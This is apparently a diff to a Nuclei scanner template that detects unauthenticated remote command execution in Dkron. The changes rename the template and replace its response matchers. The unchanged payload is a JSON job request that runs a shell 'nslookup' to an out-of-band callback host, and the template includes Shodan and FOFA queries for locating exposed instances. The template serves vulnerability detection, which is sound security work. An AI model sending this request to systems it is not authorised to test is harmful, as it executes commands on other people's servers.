@@ -1,4 +1,4 @@
-id: dkron-unauthenticated-rce
+id: dkron-unauth-rce
 
 info:
   name: Dkron - Unauthenticated Remote Command Execution
@@ -12,7 +12,7 @@ info:
     verified: true
     fofa-query: title="Dkron"
     shodan-query: title:"Dkron"
-  tags: dkron,oast,rce
+  tags: dkron,unauth,rce,oast,obb
 
 variables:
   string: "{{to_lower(rand_text_alpha(5))}}"
@@ -26,13 +26,11 @@ http:
 
         {"ephemeral":true,"disabled":false,"name":"{{string}}","schedule":"@every 1s","executor":"shell","executor_config":{"command":"nslookup  {{string}}.{{interactsh-url}}","cwd":"/tmp/","env":"ENV_VAR=va1,ANOTHER_ENV_VAR=var2","shell":"true","timeout":"10s"},"retries":null}
 
-    matchers-condition: and
     matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-
-      - type: status
-        status:
-          - 201
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'dns')"
+          - "contains(content_type, 'application/json')"
+          - "contains_all(body, 'success_count','owner_email')"
+          - "status_code == 201"
+        condition: and
